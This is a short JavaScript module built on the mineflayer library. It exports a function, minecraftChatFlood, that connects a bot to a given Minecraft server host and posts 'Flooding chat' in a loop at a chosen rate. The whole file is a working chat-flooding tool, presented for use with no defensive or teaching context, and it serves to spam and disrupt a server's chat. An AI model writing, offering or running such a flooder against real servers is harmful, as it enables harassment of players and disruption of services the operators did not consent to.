const mineflayer = require('mineflayer');

function minecraftChatFlood(target, rateLimit, logOutput) {
    const bot = mineflayer.createBot({
        host: target,
        username: 'bot',
        password: 'password'
    });

    bot.on('login', () => {
        setInterval(() => {
            bot.chat('Flooding chat');
        }, 1000 / rateLimit);
    });

    bot.on('error', (err) => {
        logOutput('Bot error: ' + err.message);
    });
}

module.exports = minecraftChatFlood;
